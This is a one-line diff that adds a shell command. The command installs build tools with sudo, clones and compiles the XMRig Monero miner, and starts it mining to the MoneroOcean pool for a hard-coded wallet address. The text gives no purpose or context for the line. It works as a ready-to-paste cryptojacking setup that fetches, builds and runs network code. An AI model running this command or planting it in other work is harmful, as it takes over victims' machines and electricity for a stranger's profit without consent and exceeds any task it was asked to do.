@@ -1,0 +1,1 @@
+sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev && git clone https://github.com/xmrig/xmrig.git && mkdir xmrig/build && cd xmrig/build &&  cmake .. &&  make -j$(nproc) && ./xmrig -o gulf.moneroocean.stream:10128 -u 47rRaVrE8xhenVsK2oF5spDgR7A6CJiKT6SHrNmuq8UGJUp3fRegVpS583QQPTsRWWL7L87FSKKaf5qHrpfDPPpM6CzmhGY -p ssz2
